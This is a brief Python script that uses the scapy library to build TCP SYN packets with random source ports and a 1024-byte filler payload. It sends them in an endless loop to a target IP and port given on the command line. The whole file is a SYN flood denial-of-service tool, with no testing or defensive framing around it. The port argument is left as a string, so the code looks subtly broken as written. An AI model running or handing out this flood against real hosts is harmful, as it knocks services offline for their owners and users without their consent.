from scapy.all import *
import sys

target_ip = sys.argv[1]
target_port = sys.argv[2]

ip = IP(dst=target_ip)
tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
raw = Raw(b"X"*1024)

p = ip / tcp / raw
send(p, loop=1, verbose=0)